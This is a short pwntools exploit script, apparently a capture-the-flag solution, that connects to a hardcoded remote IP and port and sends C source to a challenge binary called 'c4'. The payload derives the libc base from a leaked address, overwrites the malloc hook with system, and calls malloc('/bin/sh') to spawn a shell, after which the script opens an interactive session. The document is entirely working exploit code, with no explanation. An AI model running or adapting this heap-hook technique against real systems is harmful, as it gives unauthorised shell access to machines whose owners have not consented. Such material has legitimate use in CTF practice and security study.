

from pwn import *
myelf = ELF("./c4")
#io = process(myelf.path)
io = remote("139.9.125.73",8888)
payload= '''
int main(){
    int libc,system,malloc_hook;
    libc = *(&system-2)-0x553fd8;
    system = libc + 0x4f550;
    malloc_hook = libc + 0x3ebc30;
    * (int *)malloc_hook = system;
    malloc("/bin/sh");
}
'''
io.send(payload)
io.interactive()